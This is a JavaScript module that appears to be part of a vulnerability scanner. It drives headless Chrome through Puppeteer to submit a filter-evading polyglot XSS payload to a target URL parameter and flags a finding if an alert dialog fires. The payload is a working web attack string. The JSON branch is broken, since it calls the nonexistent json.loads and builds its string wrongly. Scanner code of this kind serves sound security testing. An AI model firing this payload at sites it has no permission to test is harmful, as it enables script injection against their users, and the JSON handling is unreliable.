const puppeteer = require('puppeteer');

// Spawns a client to visit the provided url with a malicious data submission to see if XSS (javascript execution) is possible.
// For now, you can only define jobs to visit specific endpoints. Automatic detection / support for endpoint lists and options to navigate to
// other pages where input may be reflected may come in the future.

// A polygot XSS payload, capable of getting past many XSS filters

exports.xssScan = async (url, parameter, reqType, dataType) => {
    // A polygot XSS payload, capable of getting past many XSS filters
    let payload = encodeURIComponent("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e");
    let contentType = 'application/x-www-form-urlencoded';
    if(dataType === "base64") {
        payload = btoa(payload);
        contentType = "application/octet-stream";
    } else if (dataType === "JSON") {
        payload = json.loads(`{${parameter}: " + payload + "}`);
        if(reqType === "GET" || reqType === "DELETE") {
            payload = encodeURIComponent(payload);
        }
        contentType = 'application/json';
    }

    const browser = await puppeteer.launch({
        executablePath: '/usr/bin/google-chrome-stable',
        args: ['--no-sandbox']
    });
    const page = await browser.newPage();
    let retval = undefined;
    page.on('dialog', async dialog => {
        // XSS is possible! 
        await dialog.accept();
        retval = {
            "category": "XSS (Cross Site Scripting)",
            "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "recommendations": "Perform sanitization of user input, create a CSP security policy, and/or avoid reflection of user input on the page."
        };
    })

    await page.setRequestInterception(true);

    // Simple payload submission in the parameter
    if(reqType === "GET" || reqType === "DELETE") {
        page.on('request', interceptedRequest => {
            interceptedRequest.continue({
                method: reqType,
                headers: {
                    ...interceptedRequest.headers(),
                    'Content-Type': contentType,
                },
            });
        });
        await page.goto(url + `?${parameter}=` + payload);
    } else {
        page.on('request', interceptedRequest => {
            interceptedRequest.continue({
                method: reqType,
                postData: payload,
                headers: {
                    ...interceptedRequest.headers(),
                    'Content-Type': contentType,
                },
            });
        });
        await page.goto(url);
    }
    await new Promise((resolve) => setTimeout(resolve, 3000));
    await browser.close();
    return retval;
}